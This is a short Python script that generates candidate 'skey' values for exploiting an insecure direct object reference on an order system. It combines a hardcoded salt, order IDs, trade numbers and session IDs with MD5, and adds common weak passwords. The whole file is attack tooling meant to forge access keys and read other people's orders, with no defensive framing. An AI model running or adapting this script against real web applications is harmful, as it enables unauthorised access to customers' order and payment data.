#!/usr/bin/env python3
"""Generate skey candidates from decoded hashsalt for order IDOR."""
import hashlib

HASHSALT = "8d6673bb4bde73830ed11c898186a872"

def candidates(order_id, trade_no=None, mysid=None):
    s = set()
    oid = str(order_id)
    s.add("")
    s.add(HASHSALT)
    s.add(oid)
    # md5 combos
    for a, b in [
        (oid, HASHSALT), (HASHSALT, oid),
        (oid, ""), ("", oid),
        (oid, "xinhe001"), (oid, "xinghe001"),
    ]:
        s.add(hashlib.md5((a + b).encode()).hexdigest())
    if trade_no:
        tn = str(trade_no)
        s.add(tn)
        s.add(hashlib.md5((tn + HASHSALT).encode()).hexdigest())
        s.add(hashlib.md5((HASHSALT + tn).encode()).hexdigest())
    if mysid:
        s.add(mysid)
        s.add(hashlib.md5((oid + mysid).encode()).hexdigest())
    # weak passwords
    for p in ["123456","888888","666666","password","test","abc123","111111","000000"]:
        s.add(p)
    return list(s)

if __name__ == "__main__":
    for i in range(1, 6):
        c = candidates(i)
        print(f"id={i}: {len(c)} candidates")
        print(" ", c[:8])
